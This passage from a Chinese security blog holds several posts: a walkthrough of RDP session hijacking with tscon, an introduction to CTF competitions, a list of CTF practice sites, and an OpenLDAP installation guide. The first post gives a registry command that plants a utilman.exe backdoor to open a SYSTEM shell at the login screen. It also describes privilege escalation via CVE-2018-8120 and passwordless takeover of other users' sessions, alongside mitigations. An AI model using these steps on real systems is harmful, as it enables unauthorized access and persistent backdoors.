href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/" target="_blank" rel="noopener">渗透技巧——从Admin权限切换到System权限</a>有过详细介绍，常用方法有如下四种：</p><ul><li>通过创建服务获得System权限</li><li>利用 MSIExec 获得System权限</li><li>利用 token 复制获得System权限</li><li>各种提权漏洞</li></ul><h4 id="攻击场景1"><a href="#攻击场景1" class="headerlink" title="攻击场景1"></a>攻击场景1</h4><p>在渗透 Windows Server 的时候，默认情况下 mimikatz 无法导出明文口令，测试环境下，通过某些方法获得了服务器的一个用户名密码，可以通过远程桌面进行登录。如果登录后发现后台存在另一用户，由于未导出明文口令，通过常规方法无法切换至另一用户的桌面，这里就可以借助上文提到的方法，先提权至 System 权限，再切换过去。</p><p>值得注意的是，如果当用户通过远程桌面登录后，直接<strong>点击关闭</strong>断开连接却没有注销，此时该会话并没有结束，后台显示Disconnected，如下图：</p>{% image https://i.loli.net/2019/03/23/5c95ed8f4dd1b.jpg '' '' %}<p>此时，仍能在 system 权限下通过 tscon 实现未授权连接。因此在平时的渗透中，可以利用这一点来获取 disconnected 用户会话的远程桌面。</p><p>这里利用 <a href="https://github.com/alpha1ab/CVE-2018-8120/tree/master/CVE-2018-8120" target="_blank" rel="noopener">CVE-2018-8120</a> 进行提权，提权 exe 已放到用户 user1 的桌面上。执行 <code>tscon 2</code> 即可<strong>无需密码</strong>顺利切换到 test1 用户的远程桌面。</p>{% image https://i.loli.net/2019/03/23/5c95edef99b0b.jpg '' '' %}<h4 id="攻击场景2"><a href="#攻击场景2" class="headerlink" title="攻击场景2"></a>攻击场景2</h4><p>假设你已经成功得到了 user1 这个用户的用户名密码，入侵到了一台 Windows Server 2008 主机，即我们的靶机，这个时候要提权到 System 权限有多种姿势，这里利用 <a href="https://github.com/alpha1ab/CVE-2018-8120/tree/master/CVE-2018-8120" target="_blank" rel="noopener">CVE-2018-8120</a> 进行提权，提权 exe 已放到用户 user1 的桌面上</p>{% image https://i.loli.net/2019/03/23/5c95e0ab5c7c2.jpg '' '' %}<p>得到 System 权限后，可以利用辅助工具（快捷键为 Win+U）给主机装个后门，命令如下（命令已放到 user1 桌面）：</p><pre><code>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\windows\system32\cmd.exe&quot; /f</code></pre><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/03/23/5c95f000c87bb.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>这时我们可以利用后门绕过登陆界面。锁定 user 1 用户回到登陆界面，可以点击轻松访问图标（或者快捷键 Win + U）对其调用，在登录界面启动辅助工具管理器，弹出 cmd.exe，权限为 system</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/03/23/5c95f0c03b34b.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>这时通过 <code>tscon 1</code> 可<strong>无需密码</strong>直接切换至目标用户的桌面，大功告成。如果受限的话可以利用 WMI 做中转，具体可以看先知社区的利用<a href="http://www.mottoin.com/tech/110211.html" target="_blank" rel="noopener">文章</a></p><p>删除后门，使用 SYSTEM 权限执行命令：</p><pre><code>REG DELETE &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot;</code></pre><hr><h3 id="其它应用场景"><a href="#其它应用场景" class="headerlink" title="其它应用场景"></a>其它应用场景</h3><ul><li>劫持系统上较旧的管理员会话。</li><li>此技术还可用于解锁锁定的会话。</li><li>IT管理员可以劫持业务用户的会话以访问组织中的敏感系统。</li><li>某个管理员可以通过劫持他的会话和执行未经授权的活动来暗中访问某些系统的其他管理员。</li></ul><p>最重要的是，对于上述场景，攻击者不需要 Metasploit，mimikatz 等工具，这些工具通常用于用户的令牌操作和模拟登录用户。我们只要用到 tscon 这个内置命令就好了。每个管理员都可以通过物理访问本地模拟任何登录用户，也可以通过远程桌面远程模拟任何登录用户。</p><hr><h3 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h3><ol><li>Github 上有一个 <a href="https://github.com/crazywifi/RDP_SessionHijacking" target="_blank" rel="noopener">批处理攻击脚本</a></li><li><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a> 有一个模块也已经集成了这个漏洞，直接利用即可</li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://cdn-images-1.medium.com/max/1600/1*oFF3A3KhTzGrEnS_3vV36g.gif" alt title>                </div>                <div class="image-caption"></div>            </figure><hr><h3 id="如何避免"><a href="#如何避免" class="headerlink" title="如何避免"></a>如何避免</h3><ol><li>组策略：建议在用户断开连接后立即或快速使用组策略注销断开连接的会话。</li><li>在退出远程桌面的时候先注销，不要直接点关闭。</li><li>不要将RDS / RDP暴露给互联网：如果一定要这样做，则必须实施多因素身份验证。</li><li>打开事件日志、事件转发等功能。</li><li>不要滥用 SYSTEM 权限。</li></ol><hr><h2 id="靶机搭建记录"><a href="#靶机搭建记录" class="headerlink" title="靶机搭建记录"></a>靶机搭建记录</h2><p>找个可以远程登陆的WIN 7精简版</p><ol><li><a href="https://blog.csdn.net/csnewdn/article/details/53780634" target="_blank" rel="noopener">开启防火墙和配置远程桌面</a></li><li>创建测试账户并配置远程桌面权限</li><li>开启多个用户同时登陆：gpedit.msc–&gt;计算机配置—&gt;管理模板—&gt;Windows组件—&gt;远程桌面服务—&gt;远程桌面会话主机—&gt;连接—&gt;限制连接的数量。如果是 Windows Server 版本的话默认为 3，无需设置。</li><li>UniversalTermsrvPatch 破解dll配置可多人登陆</li></ol><p>发现精简版把轻松访问都删了没法演示后门，因此找了完整版server08 32位来演示，靶机有点大，启动可能有点慢。</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>啥是CTF？新手如何入门CTF？</title>
      <link href="20190407/%E5%95%A5%E6%98%AFCTF%EF%BC%9F%E6%96%B0%E6%89%8B%E5%A6%82%E4%BD%95%E5%85%A5%E9%97%A8CTF%EF%BC%9F.html"/>
      <url>20190407/%E5%95%A5%E6%98%AFCTF%EF%BC%9F%E6%96%B0%E6%89%8B%E5%A6%82%E4%BD%95%E5%85%A5%E9%97%A8CTF%EF%BC%9F.html</url>
      
        <content type="html"><![CDATA[<p>CTF 科普 + CTF 新手入门小指南。</p><a id="more"></a><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload-images.jianshu.io/upload_images/5814060-06aa5eb8946e1657?imageMogr2/auto-orient/strip%7CimageView2/2/w/650/format/webp" alt title>                </div>                <div class="image-caption"></div>            </figure><blockquote><p>原文请查看公众号 <strong>NeverSec</strong> ，格式更丰富，阅读体验更好哦！</p></blockquote><h2 id="CTF是啥"><a href="#CTF是啥" class="headerlink" title="CTF是啥"></a>CTF是啥</h2><p>CTF 是 Capture The Flag 的简称，中文咱们叫<strong>夺旗赛</strong>，其本意是西方的一种传统运动。在比赛上两军会互相争夺旗帜，当有一方的旗帜已被敌军夺取，就代表了那一方的战败。在信息安全领域的 CTF 是说，通过各种<strong>攻击手法</strong>，获取服务器后寻找指定的<strong>字段</strong>，或者文件中某一个固定格式的字段，这个字段叫做 flag，其形式一般为 <strong>flag{xxxxxxxx}</strong>，提交到裁判机就可以得分。</p><p>信息安全的 CTF 的历史可以说很长了，最早起源于 96 年的 <strong>DEFCON</strong> 全球黑客大会（美国最大的网络安全会议，今年 5 月在北京举行哦，有兴趣可以去听听，特别好玩）。</p><h2 id="为啥要CTF"><a href="#为啥要CTF" class="headerlink" title="为啥要CTF"></a>为啥要CTF</h2><p>入门渗透，那肯定得各种练手对不对？但因为由于 「网络安全法」的颁布，随意扫描他人网站，或非授权渗透测试都有一定的风险。最近也有个新闻：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload-images.jianshu.io/upload_images/5814060-f59132df5a217e03?imageMogr2/auto-orient/strip%7CimageView2/2/w/430/format/webp" alt title>                </div>                <div class="image-caption"></div>            </figure><p>说实话，这小伙只是在扫描，攻击都被防火墙拦下了，啥都没弄到，结果还是一样被判刑，可谓是偷鸡不成蚀把米了……</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload-images.jianshu.io/upload_images/5814060-75863ff7a0593e05?imageMogr2/auto-orient/strip%7CimageView2/2/w/268/format/webp" alt title>                </div>                <div class="image-caption"></div>            </figure><p>所以记住千万<strong>不要乱扫</strong>国内的网站，尤其是教育、政府类网站。但初入门的同学学习渗透测试没有一个对应的环境也是不行的，而常见的靶机对于小白来说太过复杂，很容易不知如何下手。</p><p>这个时候 CTF 就非常适合了，CTF 一般是一个题目有一个或几个知识点相互糅合，相对来说目标性比较强。如果想要体会到安全的成就感和趣味性，促进自己边练边学，CTF 就是一个很好的选择。</p><h2 id="CTF-的类型"><a href="#CTF-的类型" class="headerlink" title="CTF 的类型"></a>CTF 的类型</h2><p>CTF 题目类型一般分为 Web 渗透、RE 逆向、Misc 杂项、PWN 二进制漏洞利用、Crypto 密码破译，有志于渗透测试的同学一开始建议从 Web 渗透的题目开始，辅以 Misc 杂项和 Crypto 密码学。</p><p>CTF 主要分为两种模式，一是<strong>解题模式</strong>。对于 Web 安全来说，会要求你入侵网站或者靶机，攻击成功后系统会显示flag或者在某个目录 文件 数据库寻找 Flag，提交到答题系统得分。逆向工程题目一般形式是破解注册机、动态调试、dump 内存等等。这些题目可以百度或谷歌别人的解题报告（ 关键字：CTF writeup）来认识一下。</p><p>这种模式的缺点是类似于“应试教育”，当前的趋势是注重出题难、出题偏，没有考虑实际，就跟奥数似的。而且这种模式只有攻击，却没有防守，而在企业中工作更多的还是考虑如何防护的问题，这个时候 AWD 攻防赛模式就应运而生了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload-images.jianshu.io/upload_images/5814060-bf646749a49b4526?imageMogr2/auto-orient/strip%7CimageView2/2/w/296/format/webp" alt title>                </div>                <div class="image-caption"></div>            </figure><p>二是<strong>攻防赛</strong>，也叫 AWD(Attack With Defense，攻防兼备)模式。你需要在一场比赛里要扮演攻击方和防守方，攻者得分，失守者会被扣分。也就是说，攻击别人的靶机可以获取 Flag 分数时，别人会被扣分，同时你也要保护自己的主机不被别人得分，以防扣分。</p><p>这种模式非常激烈，准备要非常充分，手上要有充足的防守方案和 EXP 攻击脚本。我第一次参加这种比赛的时候就被人打惨了QWQ，不过后面参赛越多，积累的经验就会越多。所以说，这种比赛不用慌，多打多学多积累就好了。</p><p>CTF 里面也有一血之说，谁第一个交 Flag 能获得分数加成，所以说手快也很重要。<del>不过一般来说是没有别的大佬手快的。</del></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload-images.jianshu.io/upload_images/5814060-288e4049b55e90dd?imageMogr2/auto-orient/strip%7CimageView2/2/w/429/format/webp" alt title>                </div>                <div class="image-caption"></div>            </figure><p>至于每个类型有什么题目，你可以去参加一个 CTF 赛事，打了一次之后你就会有所了解了。</p><h2 id="CTF-和现实渗透的对比"><a href="#CTF-和现实渗透的对比" class="headerlink" title="CTF 和现实渗透的对比"></a>CTF 和现实渗透的对比</h2><p>现实的渗透测试会有非常完整的流程，从信息收集、漏洞探测开始，再逐项攻击，很多时候会一无所获。相比之下，CTF 的目标会比较<strong>明确</strong>，中等难度以下的题目一般都会在题目描述中提示漏洞的发生处，没有提示的话检测点也不会很多，一个个筛查就可以了。</p><p>其次，有很多 CTF 题目会有点脱离现实渗透，套路、脑洞比较多，有的知识点并不实用……怎么说呢？</p><p>有的时候出题人为了出点新题会把题目设置得脑洞要特别大才能做出来，Misc 安全杂项更是这种题的重灾区。做这种题其实对现实渗透没啥帮助，比如说这道密码题，第一次见的时候头大得一笔，各位看官先猜猜看是啥：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload-images.jianshu.io/upload_images/5814060-a447dda4dc724637?imageMogr2/auto-orient/strip%7CimageView2/2/w/402/format/webp" alt title>                </div>                <div class="image-caption"></div>            </figure><p>做多了 CTF 的同学应该知道，这是「与佛论禅」密码加密，也不知道是谁想出来的……</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload-images.jianshu.io/upload_images/5814060-20b19f538fd1af6a?imageMogr2/auto-orient/strip%7CimageView2/2/w/471/format/webp" alt title>                </div>                <div class="image-caption"></div>            </figure><p>类似这种摸不着头脑、要用特别奇怪的姿势或套路做题的题目也屡见不鲜。其实这也一定程度偏离了 CTF 的初衷，我们是要提高自己的<strong>安全姿势水平</strong>，而不是大开脑洞。</p><p>因此较为简单、脑洞略大的 CTF 题仅作扩充知识面就好了。话虽如此，现在 CTF 大赛都已经往<strong>实战</strong>的方向走了，高水准的 CTF 题目很多都会模拟真实的网站，让你更加有真实渗透的代入感，渗透手法也更加贴近实战。国内比较良心的 CTF 有 DDCTF、安恒杯月赛 CTF 等等。</p><p>关于 CTF 赛事的信息可以关注 XCTF 社区或 CTFtime 整理的赛事链接，详请看下方链接。虽然非常<del>可能</del>在比赛里打不过各位大佬，但是划划水，学习学习知识也是非常不错滴。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload-images.jianshu.io/upload_images/5814060-d3025e441db896b0?imageMogr2/auto-orient/strip%7CimageView2/2/w/184/format/webp" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我搜集了一些入门比较可以的 CTF 靶场，想了想，把集合文章放到自己废弃已久的博客上，以后会在博客更新技术文章，这个公众号依然不讲啥技术，说点儿硬硬的经验干货就好了。靶场集合点击下方： 为了防吞，也可以复制链接到浏览器查看：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fneversec.top%2F20190404%2F%25E6%2596%25B0%25E6%2589%258B%25E5%258F%258B%25E5%25A5%25BD%25E7%259A%2584CTF%25E9%259D%25B6%25E5%259C%25BA%25E6%2595%25B4%25E7%2590%2586%25E5%2590%2588%25E9%259B%2586.html" target="_blank" rel="noopener">新手友好的CTF靶场整理合集-NeverSec的博客</a></p><p>新手入门的话，在靶场慢慢刷题，对于不会的题目直接百度或者谷歌，都会有很多解题报告，遇到不会的知识点也要善于使用搜索引擎。最好的方法还是加入一个 CTF 小组，大家互相帮助，提高得会更加快。有什么方面需要我说得更加详细的，欢迎留言或者发消息。</p><p>最近事情比较多，有点突发状况，文章难产了好久……对各位说声不好意思。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload-images.jianshu.io/upload_images/5814060-4864cb94f0e38b10?imageMogr2/auto-orient/strip%7CimageView2/2/w/228/format/webp" alt title>                </div>                <div class="image-caption"></div>            </figure><p>清明小长假归来，新的一周，继续开干！</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload-images.jianshu.io/upload_images/5814060-8ecc0e2dd79b73f0?imageMogr2/auto-orient/strip%7CimageView2/2/w/255/format/webp" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://upload-images.jianshu.io/upload_images/5814060-0d32a11d6e6013de?imageMogr2/auto-orient/strip%7CimageView2/2/w/420/format/webp" alt title>                </div>                <div class="image-caption"></div>            </figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新手友好的CTF靶场整理合集</title>
      <link href="20190404/%E6%96%B0%E6%89%8B%E5%8F%8B%E5%A5%BD%E7%9A%84CTF%E9%9D%B6%E5%9C%BA%E6%95%B4%E7%90%86%E5%90%88%E9%9B%86.html"/>
      <url>20190404/%E6%96%B0%E6%89%8B%E5%8F%8B%E5%A5%BD%E7%9A%84CTF%E9%9D%B6%E5%9C%BA%E6%95%B4%E7%90%86%E5%90%88%E9%9B%86.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我整理得没有那么全，这里的合集主要还是面对新手。做题贵精不在多，好好练习每一题，学习每个知识点，不懂的百度或者 Google 即可。记住，你是为了提高自己而去打 CTF 。</p><a id="more"></a><h2 id="CTF-比赛时间表"><a href="#CTF-比赛时间表" class="headerlink" title="CTF 比赛时间表"></a>CTF 比赛时间表</h2><ul><li>CTFwiki（入门必看wiki）: <a href="https://ctf-wiki.github.io/ctf-wiki/#/introduction" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/#/introduction</a></li><li>XCTF社区： <a href="https://time.xctf.org.cn" target="_blank" rel="noopener">https://time.xctf.org.cn</a></li><li>i春秋: <a href="https://www.ichunqiu.com/competition" target="_blank" rel="noopener">https://www.ichunqiu.com/competition</a></li><li>CTFrank: <a href="https://ctfrank.org/" target="_blank" rel="noopener">https://ctfrank.org/</a></li><li>CTFtime（基本都是国外的）: <a href="https://ctftime.org" target="_blank" rel="noopener">https://ctftime.org</a> </li></ul><h2 id="本地靶场"><a href="#本地靶场" class="headerlink" title="本地靶场"></a>本地靶场</h2><ul><li>SQLi: <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></li><li>DVWA: <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></li><li>metsploitable3: <a href="https://github.com/rapid7/metasploitable3/" target="_blank" rel="noopener">https://github.com/rapid7/metasploitable3/</a></li><li>Webgoat: <a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></li><li>Juiceshop: <a href="https://github.com/bkimminich/juice-shop" target="_blank" rel="noopener">https://github.com/bkimminich/juice-shop</a></li></ul><h2 id="国内-CTF"><a href="#国内-CTF" class="headerlink" title="国内 CTF"></a>国内 CTF</h2><ul><li>实验吧: <a href="http://www.shiyanbar.com" target="_blank" rel="noopener">http://www.shiyanbar.com</a></li><li>XCTF 实训平台: <a href="http://oj.xctf.org.cn" target="_blank" rel="noopener">http://oj.xctf.org.cn</a></li><li>安恒周周练： <a href="https://www.linkedbyx.com/home" target="_blank" rel="noopener">https://www.linkedbyx.com/home</a></li><li>XSS专练： <a href="https://xss.haozi.me/tools/xss-encode/" target="_blank" rel="noopener">https://xss.haozi.me/tools/xss-encode/</a></li><li>南京邮电大学CTF/网络攻防训练平台: <a href="http://ctf.nuptzj.cn/" target="_blank" rel="noopener">http://ctf.nuptzj.cn/</a></li><li>BugkuCTF: <a href="https://ctf.bugku.com/" target="_blank" rel="noopener">https://ctf.bugku.com/</a></li></ul><h2 id="国外-CTF"><a href="#国外-CTF" class="headerlink" title="国外 CTF"></a>国外 CTF</h2><ul><li>Root-me: <a href="https://root-me.org" target="_blank" rel="noopener">https://root-me.org</a></li><li>CTF365: <a href="https://ctf365.com/" target="_blank" rel="noopener">https://ctf365.com/</a></li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul><li>Vulhub: <a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></li></ul><h2 id="其它大佬整理的链接"><a href="#其它大佬整理的链接" class="headerlink" title="其它大佬整理的链接"></a>其它大佬整理的链接</h2><p>多搜搜，很多前辈已经整理了很多啦！</p><ul><li><p>Awesome-Platforms/CTF-Platforms: <a href="https://github.com/We5ter/Awesome-Platforms/blob/master/CTF-Platforms.md" target="_blank" rel="noopener">https://github.com/We5ter/Awesome-Platforms/blob/master/CTF-Platforms.md</a></p></li><li><p>知乎提问： <a href="https://www.zhihu.com/question/267204109/answer/320502511" target="_blank" rel="noopener">https://www.zhihu.com/question/267204109/answer/320502511</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LDAP安装和基本管理手记</title>
      <link href="20180329/LDAP%E5%AE%89%E8%A3%85%E5%92%8C%E5%9F%BA%E6%9C%AC%E7%AE%A1%E7%90%86%E6%89%8B%E8%AE%B0.html"/>
      <url>20180329/LDAP%E5%AE%89%E8%A3%85%E5%92%8C%E5%9F%BA%E6%9C%AC%E7%AE%A1%E7%90%86%E6%89%8B%E8%AE%B0.html</url>
      
        <content type="html"><![CDATA[<p>OpenLDAP 是轻型目录访问协议（Lightweight Directory Access Protocol，LDAP）的自由和开源的实现，在其OpenLDAP许可证下发行，并已经被包含在众多流行的 Linux 发行版中。这里记录下如何安装和基本的管理操作。</p><a id="more"></a><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>以下操作均为CentOS 7</p><ol><li>关闭SELINUX</li><li>打开防火墙tcp 389 / 636端口或者关闭防火墙</li></ol><blockquote><p>tcp 389 是openldap 明文传输端口，tcp 636是ssl加密传输的端口。</p></blockquote><blockquote><p>centos7默认自带firewalld服务，可以停用之后安装iptables</p></blockquote><pre><code class="bash">sed -i &#39;/SELINUX/s/enforcing/disabled/&#39; /etc/selinux/config &amp;&amp; setenforce 0 &amp;&amp; systemctl disable firewalld.service &amp;&amp; systemctl stop firewalld.service</code></pre><h2 id="安装Berkeley-DB"><a href="#安装Berkeley-DB" class="headerlink" title="安装Berkeley DB"></a>安装Berkeley DB</h2><blockquote><p>在LDAP的README中标注了适用版本<code>BDB and HDB backends require Oracle Berkeley DB 4.4 - 4.8, or 5.0 - 5.1</code></p></blockquote><pre><code class="bash">yum -y install gcc gcc-c++ tar -xvf db-5.1.29.tar.gz -C /usr/local/srccd /usr/local/src/db-5.1.29/build_unix../dist/configure --prefix=/data/server/berkeleydbmake &amp;&amp; make installln -s /data/server/berkeleydb/include/* /usr/include/ln -s /data/server/berkeleydb/lib/* /usr/local/lib64/echo &quot;/data/server/berkeleydb/lib&quot; &gt;&gt;/etc/ld.so.confldconfig -f /etc/ld.so.conf</code></pre><h2 id="更新lib库"><a href="#更新lib库" class="headerlink" title="更新lib库"></a>更新lib库</h2><pre><code class="bash">#保证在后面编译openldap时能找到lib和include下的库echo &quot;/data/server/berkeleydb/lib/&quot; &gt; /etc/ld.so.confldconfig -v</code></pre><h2 id="安装LDAP"><a href="#安装LDAP" class="headerlink" title="安装LDAP"></a>安装LDAP</h2><pre><code class="bash">yum install *ltdl* -yyum -y install gcc gcc-c++ unzip gzip bzip2 openssl-devel cyrus-sasl-devel krb5-devel tcp_wrappers-devel libtool-ltdl-devel openslp-devel unixODBC-devel mysql-develtar zxvf openldap-2.4.46.tgz -C /usr/local/srccd /usr/local/src/openldap-2.4.46./configure --prefix=/data/server/openldap \--enable-slapd \--enable-dynacl  \--enable-aci \--enable-cleartext \--enable-crypt  \--enable-lmpasswd \--enable-spasswd \--enable-modules \--enable-rewrite \--enable-rlookups \--enable-slapi \--enable-wrappers \--enable-backends \--enable-ndb=no \--enable-perl=no \--enable-overlays \CPPFLAGS=-I/data/server/berkeleydb/include/ \LDFLAGS=-L/data/server/berkeleydb/lib/make dependmake#make testmake install</code></pre><h3 id="设置可执行命令"><a href="#设置可执行命令" class="headerlink" title="设置可执行命令"></a>设置可执行命令</h3><pre><code class="bash">cp -a /data/server/openldap/share/man/* /usr/share/man/ln -s /data/server/openldap/bin/* /usr/local/binln -s /data/server/openldap/sbin/* /usr/local/sbin</code></pre><h3 id="conf配置"><a href="#conf配置" class="headerlink" title="conf配置"></a>conf配置</h3><pre><code class="bash">slappasswd -s 123456    {SSHA}4Nxxxxxxxxxx5xxxxxAu2c# 复制密码到conf中vim /data/server/openldap/etc/openldap/slapd.conf# 添加如下几行include        /data/server/openldap/etc/openldap/schema/collective.schemainclude        /data/server/openldap/etc/openldap/schema/corba.schemainclude        /data/server/openldap/etc/openldap/schema/cosine.schemainclude        /data/server/openldap/etc/openldap/schema/duaconf.schemainclude        /data/server/openldap/etc/openldap/schema/dyngroup.schemainclude        /data/server/openldap/etc/openldap/schema/inetorgperson.schemainclude        /data/server/openldap/etc/openldap/schema/java.schemainclude        /data/server/openldap/etc/openldap/schema/misc.schemainclude        /data/server/openldap/etc/openldap/schema/nis.schemainclude        /data/server/openldap/etc/openldap/schema/openldap.schemainclude        /data/server/openldap/etc/openldap/schema/pmi.schemainclude        /data/server/openldap/etc/openldap/schema/ppolicy.schema#新增日志文件级别与路径，需要在编译时--enable-debug，否则日志文件输出，不影响调试模式;loglevel    256logfile    /data/server/openldap/var/slapd.log#修改域名及管理员账户名;suffix        &quot;dc=sys,dc=com&quot;rootdn        &quot;cn=admin,dc=sys,dc=com&quot;#使用密文密码，即前面使用slappasswd生成的密文;rootpw        {SSHA}K9+WKxxxxxxxxxxxxxxxxx</code></pre><p>LDAP连接服务器的连接字串格式为：ldap://servername/DN   </p><p>其中DN有三个属性，分别是CN,OU,DC   </p><ul><li>dc:”domainComponent”，也就是域名的组成部分，准确的说是主机域名的后缀组成部分，如果这里的配置与你的主机域名不对应的话，服务一般是启动不了的。</li><li>CN=Common Name 为用户名或服务器名，最长可以到80个字符，可以为中文；</li><li>OU=Organization Unit为组织单元，最多可以有四级，每级最长32个字符，可以为中文；</li><li>O=Organization 为组织名，可以3—64个字符长</li><li>C=Country为国家名，可选，为2个字符长<br>LDAP目录以一系列“属性对”的形式来存储记录项，每一个记录项包括属性类型和属性值（这与关系型数据库用行和列来存取数据有根本的不同）。</li></ul><p>例如：CN=test,OU=developer,DC=domainname,DC=com </p><p>在上面的代码中 cn=test 可能代表一个用户名，ou=developer 代表一个 active directory 中的组织单位。这句话的含义可能就是说明 test 这个对象处在domainname.com 域的 developer 组织单元中</p><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><pre><code class="bash">/data/server/openldap/libexec/slapd# 前台输出/data/server/openldap/libexec/slapd -d 256</code></pre><h3 id="测试导入"><a href="#测试导入" class="headerlink" title="测试导入"></a>测试导入</h3><pre><code class="bash">vim test.ldifdn: dc=sys,dc=comobjectclass: dcObjectobjectclass: organizationo: SYS.Incdc: sysdn: cn=admin,dc=sys,dc=comobjectclass: organizationalRolecn: adminldapadd -x -D &quot;cn=admin,dc=sys,dc=com&quot; -W -f test.ldif</code></pre><h3 id="Migrationtools"><a href="#Migrationtools" class="headerlink" title="Migrationtools"></a>Migrationtools</h3><pre><code class="bash">yum -y install migrationtools/usr/share/migrationtools/migrate_base.pl &gt; /root/base.ldif/usr/share/migrationtools/migrate_group.pl /etc/group /root/group.ldif/usr/share/migrationtools/migrate_group.pl /etc/passwd /root/users.ldif# 修改域信息vim /root/base.ldifvim /root/group.ldifvim /root/users.ldif# 修改ou和dc，按需    :%s/ou=Group/cn=People    :%s/dc=padl/dc=sys# 生成的文件需要修改里面的dn信息，否则服务器会拒绝执行ldapadd -c -x -D &quot;cn=admin,dc=sys,dc=com&quot; -W -f /root/base.ldifldapadd -c -x -D &quot;cn=admin,dc=sys,dc=com&quot; -W -f /root/group.ldifldapadd -c -x -D &quot;cn=admin,dc=sys,dc=com&quot; -W -f /root/users.ldif</code></pre><p>导入完后到管理工具查看</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/03/28/5abaf0de8323b.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="管理工具"><a href="#管理工具" class="headerlink" title="管理工具"></a>管理工具</h2><h3 id="LDAP-Administrator"><a href="#LDAP-Administrator" class="headerlink" title="LDAP Administrator"></a>LDAP Administrator</h3><ol><li>在 <a href="https://www.ldapadministrator.com/download.htm" target="_blank" rel="noopener">https://www.ldapadministrator.com/download.htm</a> 下载管理工具</li><li>安装完成后，打开LDAP Administrator 2017</li><li>如下点击<code>New</code>新建一个profile，或者<code>Ctrl+P</code></li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/03/28/5abaee94d0187.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><ol start="4"><li>输入profile name，点击下一步</li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/03/28/5abaef04b96a1.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><ol start="4"><li>在<code>Host</code>输入服务端地址，其他保持默认，点击下一步</li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/03/28/5abaef55ace3e.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><ol start="5"><li>选择<code>other credentials-pricipal</code>输入设置的域，如<code>cn=admin,dc=sys,dc=com</code>，输入设置的密码，点击下一步</li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/03/28/5abaeffa2e2cf.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><ol start="6"><li><code>Filter</code>保持默认，点击完成即可</li></ol><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2018/03/28/5abaf04b03be5.jpg" alt title>                </div>                <div class="image-caption"></div>            